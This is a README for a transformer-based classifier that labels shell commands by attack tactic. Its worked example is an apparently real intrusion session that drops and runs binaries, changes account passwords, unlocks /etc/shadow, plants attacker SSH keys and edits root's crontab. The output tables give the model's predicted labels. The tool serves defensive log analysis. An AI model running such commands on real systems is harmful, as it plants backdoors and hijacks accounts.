# Attack Labeller

In this folder currently lives the LogPrecis classifier.

A PyTorch-based tool to classify and label shell commands in long command-line sessions using a transformer model.

## Features

- Splits shell sessions into individual commands.
- Uses a token classification model to label each token and aggregate to
achieve labelling of commands.
- Supports long inputs via token-based chunking with overlap.
- Aggregates token-level predictions into command-level results.
- Outputs per-command labels and label spans.

## Example use 

Input: ```"LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local ; LC_ALL=C crontab -l ; scp -t ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f ~/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C chattr -i -a ~/.dhpcd ; LC_ALL=C rm -f ~/.dhpcd ; LC_ALL=C rmdir ~/.dhpcd ; scp -t ~/.dhpcd ; LC_ALL=C ~/.dhpcd ; LC_ALL=C echo ~ ; LC_ALL=C chattr -i -a /etc/shadow ; LC_ALL=C passwd ; LC_ALL=C passwd ; LC_ALL=C passwd test ; LC_ALL=C passwd test ; LC_ALL=C passwd oracle ; LC_ALL=C passwd oracle ; LC_ALL=C passwd test1 ; LC_ALL=C passwd test1 ; LC_ALL=C chattr +a /etc/shadow ; LC_ALL=C mkdir -p ~/.ssh ; LC_ALL=C chmod 700 ~/.ssh ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH >> ~/.ssh/authorized_keys ; LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 ~/.ssh/authorized_keys ; LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr8PLrPoo7bUkaR3DMjfhcmoRlFrj51aN6g0TYHejCmug3TRpg37djYKqJ539iGNcmj021ZlzDBrjfIxUY849O72GsMuytk8n3K6XFxHj8gHyOsB7NgyvE39x9/SoGq2gkQS6TFun6dhmsr+ORokfS2265RwbdEOfnwL2LnQNuhiePlOUHRqzpc0K2pu9TGo1vNRIGSymCatMUNgnNX3tfcuMP5e8f1xDVh7fx3 >> ~/.ssh/authorized_keys ; LC_ALL=C netstat -plnt ; LC_ALL=C ss -tln ; scp -t /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; LC_ALL=C rm -f /tmp/aks9ewaa068ca6xvsyl3qgwtcz ; scp -t /tmp/knrm ; scp -t /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C /tmp/knrm ; LC_ALL=C $SHELL /tmp/r ; LC_ALL=C rm -f /home/admin/.dhpcd ; scp -t /home/admin/.dhpcd ; LC_ALL=C /home/admin/.dhpcd -o 127.0.0.1:4444 -B > > /dev/null /dev/null ; LC_ALL=C top -bn1 ; LC_ALL=C crontab -l ; LC_ALL=C chattr -i /var/spool/cron/crontabs/root ; LC_ALL=C crontab - ; LC_ALL=C crontab -l ; LC_ALL=C rm -f /tmp/r /tmp/knrm ;"```

We generate to dataframes:

|    | command                                                                                                                                                               | predicted_label   |   confidence |   label_change |
|---:|:----------------------------------------------------------------------------------------------------------------------------------------------------------------------|:------------------|-------------:|---------------:|
|  0 | LC_ALL=C cat /etc/rc.local /etc/rc.d/rc.local                                                                                                                         | Discovery         |     0.987566 |              1 |
|  1 | LC_ALL=C crontab -l                                                                                                                                                   | Discovery         |     0.99612  |              1 |
|  2 | scp -t ~/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                                   | Execution         |     0.906184 |              2 |
|  3 | LC_ALL=C ~/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                                 | Execution         |     0.994058 |              2 |
|  4 | LC_ALL=C rm -f ~/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                           | Execution         |     0.758692 |              2 |
|  5 | LC_ALL=C chattr -i -a ~/.dhpcd                                                                                                                                        | Execution         |     0.933044 |              2 |
|  6 | LC_ALL=C rm -f ~/.dhpcd                                                                                                                                               | Execution         |     0.992518 |              2 |
|  7 | LC_ALL=C rmdir ~/.dhpcd                                                                                                                                               | Execution         |     0.992413 |              2 |
|  8 | scp -t ~/.dhpcd                                                                                                                                                       | Execution         |     0.99412  |              2 |
|  9 | LC_ALL=C ~/.dhpcd                                                                                                                                                     | Execution         |     0.981313 |              2 |
| 10 | LC_ALL=C echo ~                                                                                                                                                       | Discovery         |     0.997832 |              3 |
| 11 | LC_ALL=C chattr -i -a /etc/shadow                                                                                                                                     | Discovery         |     0.997966 |              3 |
| 12 | LC_ALL=C passwd                                                                                                                                                       | Discovery         |     0.997832 |              3 |
| 13 | LC_ALL=C passwd                                                                                                                                                       | Discovery         |     0.997732 |              3 |
| 14 | LC_ALL=C passwd test                                                                                                                                                  | Discovery         |     0.997538 |              3 |
| 15 | LC_ALL=C passwd test                                                                                                                                                  | Discovery         |     0.997438 |              3 |
| 16 | LC_ALL=C passwd oracle                                                                                                                                                | Discovery         |     0.996379 |              3 |
| 17 | LC_ALL=C passwd oracle                                                                                                                                                | Discovery         |     0.996435 |              3 |
| 18 | LC_ALL=C passwd test1                                                                                                                                                 | Discovery         |     0.996275 |              3 |
| 19 | LC_ALL=C passwd test1                                                                                                                                                 | Discovery         |     0.996418 |              3 |
| 20 | LC_ALL=C chattr +a /etc/shadow                                                                                                                                        | Discovery         |     0.996839 |              3 |
| 21 | LC_ALL=C mkdir -p ~/.ssh                                                                                                                                              | Discovery         |     0.994922 |              3 |
| 22 | LC_ALL=C chmod 700 ~/.ssh                                                                                                                                             | Discovery         |     0.747785 |              3 |
| 23 | LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZ   | Persistence       |     0.580962 |              4 |
| 24 | LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZ   | Persistence       |     0.807136 |              4 |
| 25 | LC_ALL=C grep ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr | Persistence       |     0.533458 |              4 |
| 26 | LC_ALL=C echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTiGm9b44ZjkQoMkcGuVsC8SGW7a9aFODS6nb64WnMwBwKPja7k56LyBBdVRm+MeKecx6Q/qLn5J+ggJ6um/LoCjKJLrX2dFOjGdyR4ZjnVBwibgr | Persistence       |     0.749832 |              4 |
| 27 | LC_ALL=C netstat -plnt                                                                                                                                                | Discovery         |     0.603318 |              5 |
| 28 | LC_ALL=C ss -tln                                                                                                                                                      | Discovery         |     0.967755 |              5 |
| 29 | scp -t /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                            | Execution         |     0.925801 |              6 |
| 30 | LC_ALL=C /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                          | Execution         |     0.974029 |              6 |
| 31 | LC_ALL=C rm -f /dev/shm/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                    | Defense Evasion   |     0.87991  |              7 |
| 32 | scp -t /tmp/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                                | Execution         |     0.86238  |              8 |
| 33 | LC_ALL=C /tmp/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                              | Execution         |     0.912162 |              8 |
| 34 | LC_ALL=C rm -f /tmp/aks9ewaa068ca6xvsyl3qgwtcz                                                                                                                        | Defense Evasion   |     0.863987 |              9 |
| 35 | scp -t /tmp/knrm                                                                                                                                                      | Defense Evasion   |     0.772499 |              9 |
| 36 | scp -t /tmp/r                                                                                                                                                         | Execution         |     0.988351 |             10 |
| 37 | LC_ALL=C /tmp/knrm                                                                                                                                                    | Execution         |     0.987262 |             10 |
| 38 | LC_ALL=C $SHELL /tmp/r                                                                                                                                                | Execution         |     0.98564  |             10 |
| 39 | LC_ALL=C /tmp/knrm                                                                                                                                                    | Execution         |     0.986047 |             10 |
| 40 | LC_ALL=C $SHELL /tmp/r                                                                                                                                                | Execution         |     0.900263 |             10 |
| 41 | LC_ALL=C rm -f /home/admin/.dhpcd                                                                                                                                     | Execution         |     0.895642 |             10 |
| 42 | scp -t /home/admin/.dhpcd                                                                                                                                             | Execution         |     0.945966 |             10 |
| 43 | LC_ALL=C /home/admin/.dhpcd -o 127.0.0.1:4444 -B > > /dev/null /dev/null                                                                                              | Execution         |     0.99683  |             10 |
| 44 | LC_ALL=C top -bn1                                                                                                                                                     | Execution         |     0.993145 |             10 |
| 45 | LC_ALL=C crontab -l                                                                                                                                                   | Execution         |     0.986939 |             10 |
| 46 | LC_ALL=C chattr -i /var/spool/cron/crontabs/root                                                                                                                      | Execution         |     0.852815 |             10 |
| 47 | LC_ALL=C crontab -                                                                                                                                                    | Execution         |     0.908075 |             10 |
| 48 | LC_ALL=C crontab -l                                                                                                                                                   | Execution         |     0.954352 |             10 |
| 49 | LC_ALL=C rm -f /tmp/r /tmp/knrm 


and 

|    | label           |   start_index |   end_index |   span_length |   mean_confidence |
|---:|:----------------|--------------:|------------:|--------------:|------------------:|
|  0 | Discovery       |             0 |           1 |             2 |          0.991843 |
|  1 | Execution       |             2 |           9 |             8 |          0.944043 |
|  2 | Discovery       |            10 |          22 |            13 |          0.977799 |
|  3 | Persistence     |            23 |          26 |             4 |          0.667847 |
|  4 | Discovery       |            27 |          28 |             2 |          0.785537 |
|  5 | Execution       |            29 |          30 |             2 |          0.949915 |
|  6 | Defense Evasion |            31 |          31 |             1 |          0.87991  |
|  7 | Execution       |            32 |          33 |             2 |          0.887271 |
|  8 | Defense Evasion |            34 |          35 |             2 |          0.818243 |
|  9 | Execution       |            36 |          48 |            13 |          0.95241  |
| 10 | Defense Evasion |            49 |          49 |             1 |          0.763001 |
